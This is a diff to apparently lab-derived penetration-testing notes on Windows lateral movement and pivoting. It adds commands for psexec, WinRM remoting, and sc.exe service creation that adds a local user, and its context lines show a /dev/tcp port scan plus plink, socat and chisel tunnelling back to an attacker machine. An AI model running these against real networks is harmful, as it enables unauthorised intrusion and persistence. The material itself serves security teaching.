@@ -2,6 +2,104 @@
 
 <figure><img src="../../../../.gitbook/assets/image (686).png" alt=""><figcaption></figcaption></figure>
 
+### Moving Through the Network
+
+Suppose we got our first compromise on the target network by using a phishing campaign. Usually, phishing campaigns are more effective against non-technical users, so our first access might be through a machine in the Marketing department
+
+Marketing workstations will typically be limited through firewall policies to access any critical services on the network
+
+<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+The simplest way would be to use standard administrative protocols like WinRM, RDP, VNC or SSH to connect to other machines around the network.
+
+### Spawning Processes Remotely
+
+methods an attacker has to spawn a process remotely, allowing them to run commands on machines where they have valid credentials:
+
+#### Psexec
+
+* **Ports:** 445/TCP (SMB)
+* **Required Group Memberships:** Administrators
+
+It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
+
+1. Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
+2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
+3. Create some named pipes to handle stdin/stdout/stderr.
+
+<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+```shell-session
+psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
+```
+
+#### Remote Process Creation Using WinRM
+
+* **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+* **Required Group Memberships:** Remote Management Users
+
+it's web-based protocol used to send Powershell commands to Windows hosts remotely.
+
+{% content-ref url="../../../../interacting-with-protocols-and-tools/tools/winrm.md" %}
+[winrm.md](../../../../interacting-with-protocols-and-tools/tools/winrm.md)
+{% endcontent-ref %}
+
+```shell-session
+winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
+```
+
+from Powershell we will need to create a PSCredential object:
+
+```powershell
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+```
+
+Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:
+
+```powershell
+Enter-PSSession -Computername TARGET -Credential $credential
+```
+
+Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM.
+
+```powershell
+Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
+```
+
+### Remotely Creating Services Using sc
+
+* **Ports:**
+  * 135/TCP, 49152-65535/TCP (DCE/RPC)
+  * 445/TCP (RPC over SMB Named Pipes)
+  * 139/TCP (RPC over SMB Named Pipes)
+* **Required Group Memberships:** Administrators
+
+Windows services can also be leveraged to run arbitrary commands since they execute a command when started.
+
+A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.
+
+<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).
+
+<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+We can create and start a service named "THMservice" using the following commands:
+
+```shell-session
+sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
+sc.exe \\TARGET start THMservice 
+```
+
+The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.
+
+### Creating Scheduled Tasks Remotely
+
+###
+
 ### Enumeration for pivoting:
 
 `arp -a` checks the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently.
@@ -22,7 +120,7 @@ Port scanning in bash can be done (ideally) entirely natively:
 
 `for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`
 
-### plink.exe
+#### plink.exe
 
 Plink.exe is a Windows command line version of the PuTTY SSH client
 
@@ -45,7 +143,7 @@ Ex:
 &#x20;if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:\
 `cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N`
 
-### Socat
+#### Socat
 
 static binaries are easy to find for both [Linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86\_64/socat) and [Windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86\_64.zip/download)
 
@@ -98,7 +196,7 @@ Use TCP port 8000 for the server listener, and do not background the process.
 ./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22&
 ```
 
-### Chisel
+#### Chisel
 
 [Chisel](https://github.com/jpillora/chisel) is an tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not
 
@@ -173,7 +271,7 @@ _If you have a chisel server running on port 4444 of 172.16.0.5, how could you c
 ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
 ```
 
-### [sshuttle](https://github.com/sshuttle/sshuttle)
+#### [sshuttle](https://github.com/sshuttle/sshuttle)
 
 &#x20;it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy _without the use of proxychains_
 
